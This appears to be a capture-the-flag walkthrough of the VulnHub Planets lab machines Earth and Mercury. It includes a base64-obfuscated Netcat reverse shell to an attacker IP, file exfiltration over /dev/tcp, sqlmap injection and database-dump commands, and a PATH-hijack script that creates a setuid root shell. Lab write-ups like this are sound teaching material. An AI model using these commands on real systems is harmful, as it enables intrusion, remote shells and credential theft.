# VulnHub: Planets

## Earth

**1. Reconnaissance**


Start the vulnhub VM. Perform a network scan to identify the target machine’s IP address.
On windows, I use ‘Zenmap’ (Nmap GUI) and netdiscover in kali.
Match the network’s MAC address to confirm the target :


<img width="1125" height="544" alt="image" src="https://github.com/user-attachments/assets/72e8dec7-5505-4004-8f37-2067af2a87d9" />


<img width="1125" height="555" alt="image" src="https://github.com/user-attachments/assets/040c7cfe-422c-41f5-b7b6-1d231b4113a9" />


The Nmap scan result  found a DNS linked to the IP.  terratest.earth.local and earth.local

<img width="1125" height="352" alt="image" src="https://github.com/user-attachments/assets/9d0cf93a-ee12-421a-93b8-dec2673c862f" />



**2. Weaponization & Deliver**


To access these domains, add them to the local hosts file.

Windows: C:\Windows\System32\drivers\etc\hosts → Edit with Notepad (Admin) and add the IP + DNS.


Linux: sudo nano /etc/hosts → Add the IP + DNS.


<img width="719" height="109" alt="image" src="https://github.com/user-attachments/assets/63178f7e-589d-4152-8417-413512c9a1cb" />

<img width="909" height="323" alt="image" src="https://github.com/user-attachments/assets/db7ba3f6-ae33-4338-a3ac-a025baca958d" />


Use ```arp -a``` to verify network mapping : 

<img width="443" height="268" alt="image" src="https://github.com/user-attachments/assets/4abb8e8d-fc40-4238-9a63-5252e560878e" />

Attempt to access the target’s web interface: 

<img width="1039" height="968" alt="image" src="https://github.com/user-attachments/assets/28d474ef-f371-42e0-a653-9590d812f993" />



**3. Exploitation**


Scan for vulnerabilities using Gobuster.
First target: earth.local — scan both HTTP and HTTPS (results may differ).


<img width="1091" height="1217" alt="image" src="https://github.com/user-attachments/assets/c5ebdad5-0862-46f9-8322-14c5d3601880" />

Next target: terratest.earth.local

<img width="1125" height="778" alt="image" src="https://github.com/user-attachments/assets/b43bb322-7bfb-4323-bb19-e747df59d01c" />


Note: HTTP 403 = request understood but access denied due to insufficient permissions.

Attempt /admin/ path → click the login hyperlink.


<img width="1125" height="380" alt="image" src="https://github.com/user-attachments/assets/cf86a4cb-e7d2-4dec-b809-b9462afc54b5" />



<img width="1125" height="586" alt="image" src="https://github.com/user-attachments/assets/424f9704-9de2-4505-9d38-0fc291b1391c" />


Explore other discovered paths : 

<img width="1030" height="273" alt="image" src="https://github.com/user-attachments/assets/e288cf4e-3a26-4016-aef0-4f34d3efa164" />


<img width="994" height="878" alt="image" src="https://github.com/user-attachments/assets/0f7e2d04-acd1-4622-b139-b6c52319a0c1" />


The testingnotes entry suggests a text file. Append it to the URL : 

<img width="1125" height="324" alt="image" src="https://github.com/user-attachments/assets/03b37abd-ad1a-4e2c-9373-c1025eac19d7" />

Clues found:


o	Username: terra


o	XOR encryption used on a message.


o	testdata.txt used for encryption testing.


Use CyberChef (https://gchq.github.io/CyberChef/) to decrypt and retrieve credentials:


<img width="1188" height="460" alt="image" src="https://github.com/user-attachments/assets/2a2a71e2-1846-44e3-88a8-12c1c89b64fc" />


<img width="983" height="419" alt="image" src="https://github.com/user-attachments/assets/b69bc3a8-e55e-46a9-891b-88a8a2370a32" />


Login : terra


Password : earthclimatechangebad4humans


Log in to the admin portal : 


<img width="1072" height="153" alt="image" src="https://github.com/user-attachments/assets/2184eb25-1c6a-4505-966d-259f58ee0c9c" />


Explore the machine directory :


<img width="1125" height="194" alt="image" src="https://github.com/user-attachments/assets/b5243a08-8990-4803-8b2f-706938faeb60" />


<img width="875" height="89" alt="image" src="https://github.com/user-attachments/assets/6fcb68dc-159a-425b-967f-6afceb253f97" />


<img width="655" height="167" alt="image" src="https://github.com/user-attachments/assets/2b706fa3-3acc-4be9-92a1-a46345ea16cb" />


<img width="1125" height="302" alt="image" src="https://github.com/user-attachments/assets/4e075543-d707-4104-885f-47c5895ad791" />


Flag obtained: **[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]**


**4. Installation**


Decode the Netcat listener command:
```echo ‘nc -e /bin/bash 192.168.1.9 4444’ | base64```

<img width="709" height="213" alt="image" src="https://github.com/user-attachments/assets/3c80ea66-d78d-4703-bcd3-528074f4399b" />


Remote connections are not allowed from target pc.

To bypass this, we need need to encrypt the command and force it to be decrypted and run at the same time.

```echo ‘nc -e /bin/bash <attacker_IP> 4444’ | base64```    (note :  Replace with your listener machine’s IP, not the target’s.)


<img width="705" height="125" alt="image" src="https://github.com/user-attachments/assets/efea4fc3-84b8-42cd-b7ec-ceb772c6632a" />


On earth.local, decode and execute in one step:
```echo ‘put-base64-string-here’ | base64 -d | bash```


The server may freeze, but the Netcat listener will receive a shell. 


<img width="1125" height="217" alt="image" src="https://github.com/user-attachments/assets/24022197-88e2-4ed2-98bd-1b0660e13195" />


<img width="789" height="191" alt="image" src="https://github.com/user-attachments/assets/3cdb4a61-3126-42ce-9ee9-8e4006bdad12" />



**5. Command & Control**



Verify access with ```whoami```


<img width="775" height="84" alt="image" src="https://github.com/user-attachments/assets/024f74d0-78fc-479a-bb47-55e0dc6116de" />


Look for weak file permission that can be executed with root privilege by apache user : 


```find / -perm -u=s -type f  2>/dev/null```


<img width="516" height="378" alt="image" src="https://github.com/user-attachments/assets/ead9403b-2a8c-4a12-8a09-553410c10be9" />


Look’s like what we need from the word itself .
Check file type: ```file /usr/bin/reset_root```


Try to run : ```reset_root``` → not executable yet.


<img width="1315" height="64" alt="image" src="https://github.com/user-attachments/assets/7ed5e9b1-068b-4beb-be60-5e77702c8402" />



**6. Privilege Escalation**


File is not executable. Yet.
Now, I will send the file to the kali using netcat to utilize other tools.


Open new terminal and type : ```nc -lvnp 3333 > reset_root```


Back to terminal that connected to the earth, type : 
```cat /usr/bin/reset_root > /dev/tcp/ <kali_IP>//3333```


<img width="1125" height="203" alt="image" src="https://github.com/user-attachments/assets/7d8b135b-91d8-4ecd-b175-42fb8d0e3041" />


Confirm transfer with ```ls```

<img width="1122" height="120" alt="image" src="https://github.com/user-attachments/assets/7cfa0fba-554b-40de-899c-bd0de8cf025f" />


Next, install ‘ltrace’ : ```sudo apt install ltrace```
run ‘ltrace’ to the file : ```ltrace ./reset_root```


<img width="1125" height="366" alt="image" src="https://github.com/user-attachments/assets/a5c6a15c-9e6e-4810-9a61-c0b15059bfa2" />


The highlighted are the files that are missing to execute the file. We need to create it in our netcat connection on the earth.local
```touch + [the filepath from the ltrace results]``` then press enter.


After creating all required files, Run the ```reset_root``` again. You see that the root password is reset to ‘Earth’


<img width="802" height="200" alt="image" src="https://github.com/user-attachments/assets/fa785e5c-387b-4400-b455-3b93050bc6c6" />



**7. Actions on Objective**


Now go to vulnhub machine. 
Login as ‘root’ with the password : Earth
Check the directory and look for the flag: ```ls```
Check the ‘root_flag.txt’


<img width="991" height="1113" alt="image" src="https://github.com/user-attachments/assets/69632922-50e4-41f0-a225-4815a771cb46" />


<br></br>
---
<br></br>

## Mercury


**1. Reconnaissance**

Objective: Identify the target system and gather initial network information. Compare the mac address from network scan result and the actual MAC address in Virtual machine :

Nmap / ZenMap for windows – Active scanning and port enumeration


Netdiscover for Kali – Passive network discovery

<img width="1125" height="383" alt="image" src="https://github.com/user-attachments/assets/d5fb6421-ab8d-40cd-a4c5-1538bad788f5" />


<img width="1013" height="113" alt="image" src="https://github.com/user-attachments/assets/c3fabafd-8ca6-4206-96be-cacbee6f7ddd" />


<img width="1125" height="316" alt="image" src="https://github.com/user-attachments/assets/4080b5cb-f9b7-47ea-9e15-6b0f541082af" />



<img width="1125" height="330" alt="image" src="https://github.com/user-attachments/assets/96668e99-b99a-49c4-9b13-412d9c3e8e46" />



Using ‘dirb’ and ‘Nmap’. It is confirmed that there is ‘robots.txt’ but disallows entry.




**Key Findings **



IP : 192.168.1.201



Open Ports :



-	22 SSH (OpenSSH)
-	8080 http (WSGI Server 0.2 – Python 3.8.2)







**2. Weaponization**




Objective: Identify vulnerable web components and prepare for exploitation.




While trying the common different url paths. I noticed something : 


<img width="1085" height="437" alt="image" src="https://github.com/user-attachments/assets/e59dd5a5-65e1-4543-b5dd-471c49802d2a" />


Tried adding it (mercuryfacts/) in the url path and I get this result : 


<img width="988" height="976" alt="image" src="https://github.com/user-attachments/assets/8493e95a-f550-4110-b043-338c9407a29b" />


/mercuryfacts/ contains:

Mercury Facts – Informational

Website Todo List – Reveals insecure DB access via raw SQL queries


<img width="1025" height="236" alt="image" src="https://github.com/user-attachments/assets/d5a3b408-aebc-4c9c-b498-a3c1f246f618" />


<img width="1019" height="444" alt="image" src="https://github.com/user-attachments/assets/09e10a4b-892a-4826-b27f-b35a1f8e061e" />




The machine use models in Django instead of direct MySQL call → They’re currently calling the DB directly. This opens the door to SQL injection.



**3. Delivery**



Objective: Deliver the payload to exploit the SQL injection vulnerability.


SQL Injection via SQLMap in Kali Linux : 
```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/”  --batch --risk=3 --level=5```

Flags explained:


•	-u → target URL


•	--batch → auto-confirm prompts


•	--risk=3 → test risky payloads


•	--level=5 → test more parameters and headers


URI parameter #1* is injectable.


<img width="912" height="596" alt="image" src="https://github.com/user-attachments/assets/d04674db-7287-441c-8659-85d0620df173" />



This lists all available databases.:
```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/ --dbs```


<img width="1125" height="1198" alt="image" src="https://github.com/user-attachments/assets/c2fbb1cb-0b69-4b98-ade9-50d6268a1688" />


<img width="1125" height="1072" alt="image" src="https://github.com/user-attachments/assets/85185aa4-2ed8-4965-bfa0-37a5e2c69d78" />



Discovered databases:<br>
•	information_schema<br>
•	mercury



**4. Exploitation**



Objective: Extract sensitive data and gain initial access.



We’ll check the ‘information_schema’ first :
```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D information_schema –tables```


<img width="1060" height="1106" alt="image" src="https://github.com/user-attachments/assets/aad5814a-27c4-4c23-893e-2f745faf23e4" />



<img width="1125" height="939" alt="image" src="https://github.com/user-attachments/assets/521cc28b-8e5a-413e-97a4-648f87d222fc" />




Didn’t see anything that is helpful to our case. Lets try the other database :<br>
```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D mercury –tables```



<img width="1125" height="773" alt="image" src="https://github.com/user-attachments/assets/8353a118-3631-4998-9bfa-58e95ff920c9" />



Dump All Data from the Table :
```sqlmap -u "http://192.168.1.201:8080/mercuryfacts/#1*/" -D mercury -T users –dump```



<img width="1125" height="859" alt="image" src="https://github.com/user-attachments/assets/fa1a2a65-6cbf-4b77-bff8-b4655e7cae38" />



We got 4 credentials. Lets try it out. 
Since there is an port 22 for ssh is open. That’s what im gonna use to enter the device system.
Login the ‘webmaster’ first since it is an obvious administrator account by the name of it.
```ssh webmaster@192.168.1.201```



<img width="1125" height="756" alt="image" src="https://github.com/user-attachments/assets/771f2295-b8bc-4501-8507-0df88c513cf2" />


Check directory : ```ls```    <br>   Check the textfile : ```cat user_flag.txt```



<img width="1125" height="247" alt="image" src="https://github.com/user-attachments/assets/dc31b956-99af-4b19-b963-1bae2f42c161" />



We got the first flag : 
**[user_flag_8339915c9a454657bd60ee58776f4ccd]**



**5. Installation**



Objective: Explore the system and identify paths for privilege escalation.



Let’s check the remaining file which is ‘mercury_proj’


<img width="1125" height="235" alt="image" src="https://github.com/user-attachments/assets/8bc08bd7-7f1a-4aba-97a0-f1be93614a56" />



Exploring the content of the directory. We got another accounts :



webmaster for web stuff - webmaster: bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK



linuxmaster for linux stuff – linuxmaster: bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== 




It says that ‘both restricted’. These strings look like Base64, obfuscated or double-encoded, which means we need to decode them




<img width="817" height="109" alt="image" src="https://github.com/user-attachments/assets/2babbc29-28d2-4969-81b9-9015d9e81515" />



webmaster for web stuff - webmaster:  mercuryisthesizeof0.056Earths


<img width="888" height="102" alt="image" src="https://github.com/user-attachments/assets/01fcdd3d-7524-46c5-9292-c61cbacac289" />



linuxmaster for linux stuff – linuxmaster: mercurymeandiameteris4880km



open another ssh session, now using the linuxmaster account : 


<img width="693" height="476" alt="image" src="https://github.com/user-attachments/assets/c52d53dd-3a61-431c-b5a1-6a59983d3c67" />



**6. Command & Control**



Objective: Establish control and identify privilege escalation vectors.



Checked the directory but It is empty. Verified the account and check the sudo access : ```sudo -l```



<img width="1455" height="270" alt="image" src="https://github.com/user-attachments/assets/6f116e30-c556-4008-b742-9c195d9ddfb2" />




We can run check_syslog.sh as root
Script Analysis :  ```cat /usr/bin/check_syslog.sh```



<img width="1125" height="144" alt="image" src="https://github.com/user-attachments/assets/12bac60b-661b-42d3-9e04-b0f29f45d066" />




That script is ripe for a PATH hijack exploit. Since /usr/bin/check_syslog.sh runs tail without a full path and we have SETENV privileges, we can craft a malicious tail binary and escalate to root.




Educational Insight:
Misconfigured scripts with elevated privileges are prime targets for PATH hijacking. This phase involves identifying such weaknesses to gain root access.



**7. Actions on Objectives**



Objective: Escalate privileges



Create a Malicious Binary : 

```
echo '#!/bin/bash' > /tmp/tail
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/tail
echo 'chmod +s /tmp/rootbash' >> /tmp/tail
chmod +x /tmp/tail
sudo PATH= /tmp:$PATH /usr/bin/check_syslog.sh
/tmp/rootbash -p
```


<img width="1125" height="284" alt="image" src="https://github.com/user-attachments/assets/0a0d74c9-53aa-49ff-8bb7-e940970a63d9" />



Check Root’s Home Directory’ : ```ls -la /root```



<img width="1125" height="629" alt="image" src="https://github.com/user-attachments/assets/8cf50f8c-5c6c-4d98-b0ec-c85885655fd7" />



Tried to check the content of ‘root_flag.txt’ using ```cat``` but It says ‘no such file or directory’




the cat command failed—likely because we’re not in the correct working directory when trying to read it :
``` cd /root```



Confirm the file exist : 
``` ls -l root_flag.txt```



<img width="1125" height="94" alt="image" src="https://github.com/user-attachments/assets/a99a9a49-b912-47b6-ba2c-ffc99656891b" />



Try to read the flag again : ``` cat root_flag.txt```


<img width="1125" height="818" alt="image" src="https://github.com/user-attachments/assets/4d699b69-49ec-4199-a75f-d9c3ba462dac" />



Now we got the final flag : **[root_flag_69426d9fda579afbffd9c2d47ca31d90]**
